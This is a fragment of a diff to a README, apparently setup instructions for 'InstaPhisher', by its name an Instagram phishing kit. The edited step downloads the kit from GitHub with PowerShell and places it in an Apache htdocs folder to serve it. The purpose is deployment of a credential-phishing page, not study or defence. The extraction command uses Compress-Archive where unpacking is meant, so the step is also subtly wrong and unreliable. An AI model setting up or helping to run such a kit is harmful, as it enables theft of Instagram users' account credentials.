@@ -111,7 +111,7 @@ AddHandler application/x-httpd-php .php
 
 ## InstaPhisher download
 
-1. Download InstaPhisher and extract 
+1. Download InstaPhisher, extract and move to apache server folder (apache24\htdocs).
 ```
 Powershell.exe Invoke-WebRequest -Uri "https://github.com/ExilasP/InstaPhisher/archive/master.zip" -OutFile "%userprofile%\Download\InstaPhisher.zip"
 Powershell.exe Compress-Archive -Path "%userprofile%\Download\InstaPhisher.zip" -DestinationPath "%userprofile%\Download\InstaPhisher"
